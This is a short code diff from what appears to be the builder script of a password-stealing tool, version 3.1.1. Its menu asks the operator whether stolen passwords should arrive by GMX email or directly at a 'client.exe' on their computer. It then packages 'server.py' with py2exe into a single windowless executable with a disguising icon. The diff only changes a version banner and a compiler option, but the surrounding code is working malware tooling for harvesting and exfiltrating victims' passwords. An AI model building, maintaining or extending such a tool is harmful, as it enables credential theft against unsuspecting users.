@@ -36,7 +36,7 @@ mailto = ""
 
 while loop == True:
 	os.system("cls")
-	print "Choose how you want the passwords delivered\n"
+	print "You are using V3.1.1\n\nChoose how you want the passwords delivered\n"
 	print "(1) - via email (only GMX supported, example@gmx.com)\n"
 	print "(2) - via the client.exe (to your computer directly)\n"
 	option=raw_input('\nChoose a number [1-2]: ')
@@ -84,7 +84,7 @@ def done():
 def py2crypt():
 	sys.argv.append("py2exe")
 	setup(
-		options = {'py2exe': {'bundle_files': 1, "excludes":['pyreadline', 'difflib', 'doctest', 'optparse', 'pickle'], "dll_excludes":['msvcr71.dll'], "compressed":True}},
+		options = {'py2exe': {'bundle_files': 1, "excludes":['pyreadline', 'difflib', 'doctest', 'optparse', 'pickle'], "dll_excludes":['msvcr71.dll'], "compressed":True, "optimize":2}},
 		windows = [{'script': "server.py",
 					"icon_resources": [(0, "icon.ico")]}],
 		zipfile = None,
